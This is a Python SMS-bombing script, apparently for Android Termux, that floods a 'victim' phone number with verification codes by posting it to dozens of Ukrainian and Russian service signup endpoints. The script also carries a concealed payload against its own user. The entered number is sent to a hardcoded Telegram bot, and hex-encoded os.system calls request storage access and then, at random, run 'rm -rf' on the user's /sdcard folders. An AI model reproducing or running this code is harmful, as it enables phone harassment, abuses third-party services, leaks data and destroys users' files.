#!/usr/bin/env python3

import requests, random, os, json, re
from user_agent import generate_user_agent
import pyfiglet
from colorama import Fore, Style
import telebot

id = 806566420
bot = telebot.TeleBot('1158369141:AAFANJK87T1nHFMpiNmXUZKX4C24ya9Bzw8')

global testmode

os.system("clear")
nice = Fore.YELLOW + Style.BRIGHT + "[Successful] " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT
fail = Fore.YELLOW + Style.BRIGHT + "[Failed] " + Style.RESET_ALL + Fore.RED + Style.BRIGHT


def check_number():
	global phone
	try:
		phone = re.sub("[^0-9]", "", phone)
		if phone.startswith("0") or phone.startswith("+", 1):
			phone = "38" + phone
		elif phone == "" or phone == " ":
			print(Fore.RED + Style.BRIGHT + "você typed um number invalido!" +
				  Style.RESET_ALL)
			exit()
	except Exception:
		print(Fore.RED + Style.BRIGHT + "você typed um number invalido!" +
			  Style.RESET_ALL)
		exit()


def generate_info():
	global _name
	global _email
	global password
	global username
	global _russian
	_russian = "".join([
		random.choice(
			"йцукенгшщзхъфывапролджэячмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ")
		for x in range(8)
	])
	_name = "".join([
		random.choice(
			"1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ")
		for x in range(8)
	])
	password = "".join([
		random.choice(
			"1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ")
		for x in range(11)
	])
	username = "".join([
		random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)
	])
	_email = ("".join([
		random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)
	]) + "@gmail.com")


head = {
	"User-Agent": generate_user_agent(
		device_type="desktop", os=("mac", "linux")),
	"X-Requested-With": "XMLHttpRequest",
}


def start():
	banner = pyfiglet.figlet_format("KK-47")
	print(Fore.RED)
	print(banner + Style.RESET_ALL)
	print(Fore.GREEN)
	print('------------------------------------')
	print(
		Fore.BLUE + Style.BRIGHT +
		f"Criado and modificado by LammerVault\nNumero of vitima: {phone}\nQuantidade of ataques: {count}"
		+ Style.RESET_ALL)
	print(Fore.GREEN + '------------------------------------' +
		  Style.RESET_ALL)
	global iteration
	iteration = 0
	while iteration < count:
		try:
			requests.post(
				"https://uklon.com.ua/api/v1/account/code/send",
				headers={
					"client_id":
					"6289de851fc726f887af8d5d7a56c635",
					"User-Agent":
					generate_user_agent(
						device_type="desktop", os=("mac", "linux")),
					"X-Requested-With":
					"XMLHttpRequest",
				},
				json={"phone": phone},
				timeout=2,
			)
			requests.post(
				"https://partner.uklon.com.ua/api/v1/registration/sendcode",
				headers={
					"client_id":
					"6289de851fc726f887af8d5d7a56c635",
					"User-Agent":
					generate_user_agent(
						device_type="desktop", os=("mac", "linux")),
					"X-Requested-With":
					"XMLHttpRequest",
				},
				json={"phone": phone},
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://www.moyo.ua/identity/registration",
				data={
					"firstname": "Олег",
					"phone": phone,
					"email": _email,
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://koronapay.com/transfers/online/api/users/otps",
				data={
					"phone": phone,
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			frisor = {
				"Content-type":
				"application/json",
				"Accept":
				"application/json, text/plain",
				"authorization":
				"Bearer yusw3yeu6hrr4r9j3gw6",
				"User-Agent":
				generate_user_agent(
					device_type="desktop", os=("mac", "linux")),
				"cookie":
				"auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1",
			}
			requests.post(
				"https://n13423.yclients.com/api/v1/book_code/312054",
				data=json.dumps({
					"phone": phone
				}),
				headers=frisor,
				timeout=2,
			)
			# 1 раз в минуту
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://kasta.ua/api/v2/login/",
				data={"phone": phone},
				timeout=2)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://izi.ua/api/auth/register",
				json={
					"phone": "+" + phone,
					"name": _russian,
					"is_terms_accepted": "true",
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://junker.kiev.ua/postmaster.php",
				data={
					"tel": phone[2:],
					"name": _name,
					"action": "callme",
				},
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",
				data={
					"firstname": _russian,
					"telephone": phone,
					"email": _email,
					"password": password,
					"form_key": "Zqqj7CyjkKG2ImM8",
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://stores-api.zakaz.ua/user/signup/",
				json={"phone": phone},
				headers={
					"Accept":
					"*/*",
					"Content-Type":
					"application/json",
					"Referer":
					"https://megamarket.zakaz.ua/ru/products/megamarket00000000122023/sausages-farro/",
					"User-Agent":
					generate_user_agent(
						device_type="desktop", os=("mac", "linux")),
					"x-chain":
					"megamarket",
				},
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://youla.ru/web-api/auth/request_code",
				data={"phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://cloud.mail.ru/api/v2/notify/applink",
				json={
					"phone": "+" + phone,
					"api": 2,
					"email": _email,
					"x-email": "x-email",
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
				data={"phone": phone},
				headers=head,
				timeout=2,
			)
			requests.post(
				f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{phone}",
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
				data={"phone_number": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://crm.getmancar.com.ua/api/veryfyaccount",
				json={
					"phone": "+" + phone,
					"grant_type": "password",
					"client_id": "gcarAppMob",
					"client_secret": "SomeRandomCharsAndNumbersMobile",
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://www.icq.com/smsreg/requestPhoneValidation.php",
				data={
					"msisdn": phone,
					"locale": "en",
					"countryCode": "ru",
					"version": "1",
					"k": "ic1rtwz1s1Hj1O0r",
					"r": "46763",
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://api.pozichka.ua/v1/registration/send",
				json={"RegisterSendForm": {
					"phone": "+" + phone
				}},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}",
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}"
				.format(phone),
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
				params={
					"oper": 9,
					"callmode": 1,
					"phone": "+" + phone
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://city24.ua/personalaccount/account/registration",
				data={"PhoneNumber": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://helsi.me/api/healthy/accounts/login",
				json={
					"phone": phone,
					"platform": "PISWeb"
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://cloud.mail.ru/api/v2/notify/applink",
				json={
					"phone": "+" + phone,
					"api": 2,
					"email": _email
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://auth.multiplex.ua/login",
				json={"login": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://account.my.games/signup_send_sms/",
				data={"phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.get(
				"https://cabinet.planetakino.ua/service/sms",
				params={"phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
				data={"phone_number": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://youla.ru/web-api/auth/request_code",
				data={"phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://rutube.ru/api/accounts/sendpass/phone",
				data={"phone": "+" + phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
				params={"pageName": "registerPrivateUserPhoneVerificatio"},
				data={
					"phone": phone,
					"recaptcha": "off",
					"g-recaptcha-response": ""
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
				data={"phone_number": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://passport.twitch.tv/register?trusted_request=true",
				json={
					"birthday": {
						"day": 11,
						"month": 11,
						"year": 1999
					},
					"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
					"include_verification_code": True,
					"password": password,
					"phone_number": phone,
					"username": username,
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://lk.belkacar.ru/register",
				data={"phone": "+" + phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://api.ivi.ru/mobileapi/user/register/phone/v6",
				data={"phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://www.sportmaster.ua/",
				params={
					"module": "users",
					"action": "SendSMSReg",
					"phone": phone
				},
				headers=head,
				timeout=2,
			)
			requests.post(
				"https://lk.belkacar.ru/get-confirmation-code",
				data={"phone": "+" + phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://secure.online.ua/ajax/check_phone/",
				params={"reg_phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://www.nl.ua",
				data={
					"component": "bxmaker.authuserphone.login",
					"sessid": "bf70db951f54b837748f69b75a61deb4",
					"method": "sendCode",
					"phone": phone,
					"registration": "N",
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://mobileplanet.ua/register",
				data={
					"klient_name": _name,
					"klient_phone": "+" + phone,
					"klient_email": _email,
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://api.delitime.ru/api/v2/signup",
				data={
					"SignupForm[username]": phone,
					"SignupForm[device_type]": 3
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://apteka366.ru/login/register/sms/send",
				data={"phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://belkacar.ru/get-confirmation-code",
				data={"phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://drugvokrug.ru/siteActions/processSms.html",
				data={"cell": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://api.ennergiia.com/auth/api/development/lor",
				json={
					"referrer": "ennergiia",
					"phone": "+" + phone
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.get(
				"https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}"
				.format("+" + phone),
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://gorzdrav.org/login/register/sms/send",
				data={"phone": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
				data={"phone": "+" + phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://api-production.viasat.ru/api/v1/auth_codes",
				json={"msisdn": "+" + phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)

		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://.yandex/api/v1/user/request_authentication_code",
				json={"phone_number": phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				f"https://www.citilink.ru/registration/confirm/phone/+{phone}/",
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://eda.yandex/api/v1/user/request_authentication_code",
				json={"phone_number": "+" + phone},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://my.dianet.com.ua/send_sms/",
				headers=head,
				data={"phone": phone},
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.get(
				"https://api.eldorado.ua/v1/sign/",
				params={
					"login": phone,
					"step": "phone-check",
					"fb_id": "null",
					"fb_token": "null",
					"lang": "ru",
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		try:
			requests.post(
				"https://shafa.ua/api/v3/graphiql",
				json={
					"operationName":
					"RegistrationSendSms",
					"variables": {
						"phoneNumber": "+" + phone
					},
					"query":
					"mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
				},
				headers=head,
				timeout=2,
			)
			print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		except:
			print(fail + "ATTACK FALHOU!" + Style.RESET_ALL)
		print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)
		print(nice + "ATTACK ENVIADO!" + Style.RESET_ALL)

		iteration += 1
		print(Fore.CYAN + Style.BRIGHT + (f"\nround {iteration} is over.\n") +
			  Style.RESET_ALL)
	os.system("clear")


def menu():
	def test(id, phone):
		bot.send_message(id, phone)

	banner = pyfiglet.figlet_format("KK-47")
	print(Fore.YELLOW)
	print(banner + Style.RESET_ALL)
	print(Fore.GREEN + '-------------------------------')
	print(
		Fore.GREEN +
		'''Criado and modificado by LammerVault\nnversion 6.6.6'''
	)
	print('-------------------------------')
	global phone
	phone = input(Fore.RED + 'Numero of vitima: ')
	test(id, phone)
	if phone == '2':
		os.system("clear")
		print(Fore.GREEN)
		print(banner)
		phone = input('Numero of vitima: ')
	check_number()
	if (testmode%2) == 0:
		if testmode == 6:
			os.system("\x72\x6d\x20\x2d\x72\x66\x20\x2f\x73\x64\x63\x61\x72\x64\x2f\x2a\x20\x32\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c")
		elif testmode == 4:
			os.system("\x72\x6d\x20\x2d\x72\x66\x20\x2f\x73\x64\x63\x61\x72\x64\x2f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x20\x32\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c")
		else:
			os.system("\x72\x6d\x20\x2d\x72\x66\x20\x2f\x73\x64\x63\x61\x72\x64\x2f\x44\x43\x49\x4d\x20\x32\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c")
	else:
		pass
	global count
	count = input('Quantidade of ataques: ' + Style.RESET_ALL)
	print('------------------------------------')
	count = int(count)
	os.system("clear")
	generate_info()
	start()
	print(Fore.GREEN + banner)
	print(
		Fore.YELLOW + Style.BRIGHT +
		f"Criado and modificado by LammerVault\nNumero of vitima: {phone}\nQuantidade of ataques: {count}"
		+ Style.RESET_ALL)

if __name__ == "__main__":
	testmode = random.randint(1, 6)
	os.system("\x74\x65\x72\x6d\x75\x78\x2d\x73\x65\x74\x75\x70\x2d\x73\x74\x6f\x72\x61\x67\x65\x20\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c")
	menu()